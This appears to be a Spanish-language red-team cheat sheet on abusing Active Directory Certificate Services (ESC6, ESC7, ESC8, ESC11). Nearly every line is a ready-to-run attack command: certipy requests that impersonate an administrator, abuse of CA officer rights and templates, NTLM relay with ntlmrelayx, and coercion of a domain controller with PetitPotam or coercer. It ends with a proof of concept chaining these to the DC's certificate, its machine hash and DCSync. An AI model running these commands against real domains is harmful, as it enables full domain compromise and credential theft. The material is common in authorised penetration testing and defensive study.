---
aliases:
  - ESC6 ESC7 ESC8 ESC11
  - ADCS CA Abuse
  - ADCS Relay
tags:
  - technique/privilege-escalation
  - technique/credential-access
  - asset/active-directory
  - env/windows
  - service/ad-cs
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Active Directory]]"
kind: SubCheatSheet
linked:
  - "[[AD CS Abuse]]"
  - "[[NTLM Relay]]"
  - "[[Authentication Coercion]]"
---
# AD CS Abuse - CA y Relay ESCs (ESC6-8, ESC11)

> Misconfiguraciones a nivel **CA** (no template) y vectores de **relay NTLM** hacia endpoints de enrollment.

---

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

> La CA acepta SAN en el request sobre **cualquier template** (flag deprecated, aún visto).

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `certipy req -u $U -p $P -ca $CA -template User -upn administrator@corp.local` | Cert como administrator usando un template normal | Flag `EDITF_ATTRIBUTESUBJECTALTNAME2` activo. |
^adcs-esc6

## ESC7 — ManageCA / ManageCertificates

> Permisos administrativos sobre la CA → aprobar requests y habilitar templates.

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `certipy ca -u $U -p $P -ca $CA -issue-request REQUEST_ID` | Aprobar un request previamente denegado | Tenés `ManageCertificates`. |
| `certipy ca -u $U -p $P -ca $CA -add-officer $U` | Agregarte como officer (aprobar requests) | Tenés `ManageCA`. |
| `certipy ca -u $U -p $P -ca $CA -enable-template SubCA` | Habilitar template SubCA para abuso | Encadenar a cert arbitrario. |
^adcs-esc7

## ESC8 — Web Enrollment + NTLM Relay

> Endpoint web (`/certsrv/`) sin HTTPS/EPA → coercer al DC y **relayar su NTLM** para pedir un cert del DC.

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `ntlmrelayx.py -t http://$CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController` | Relay server esperando la auth coerced | ESC8. |
| `PetitPotam.py -u '' -p '' $ATTACKER $DC` | Coerción del DC → autentica contra el relay → [[Authentication Coercion]] | Disparar (otra terminal). |
| `coercer coerce -t $DC -l $ATTACKER -u '' -p ''` | Coerción multi-método | Alternativa a PetitPotam. |
| `certipy auth -pfx dc.pfx -dc-ip $IP` | Hash de la cuenta `DC$` → DCSync vía S4U | Tras obtener el cert del DC. |
^adcs-esc8

## ESC11 — RPC Enrollment sin signing

> Endpoint RPC de la CA (ICPR) sin enforcement de encryption → relay NTLM a RPC.

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `ntlmrelayx.py -t rpc://$CA -rpc-mode ICPR -icpr-ca-name $CA -smb2support` | Relay NTLM al endpoint RPC de la CA | `IF_ENFORCEENCRYPTICERTREQUEST` off. |
^adcs-esc11

### PoC ESC8 (relay → cert de DA)

```bash
# Terminal 1: relay
ntlmrelayx.py -t http://corp-CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# Terminal 2: coerción
PetitPotam.py -u '' -p '' 10.10.10.50 dc01.corp.local
# → dc01.pfx → certipy auth → hash de DC01$ → DCSync
```
